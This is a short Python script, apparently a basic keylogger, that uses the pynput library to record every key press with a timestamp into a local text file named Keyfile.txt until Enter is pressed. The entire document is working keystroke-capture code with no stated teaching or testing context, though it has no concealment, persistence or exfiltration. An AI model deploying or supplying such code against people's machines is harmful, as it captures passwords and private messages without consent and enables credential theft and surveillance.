from pynput import keyboard
import datetime

def keyPressed(key):
    with open("Keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logKey.write(f"{timestamp} - {char}\n")
        except AttributeError:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logKey.write(f"{timestamp} - {str(key)}\n")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
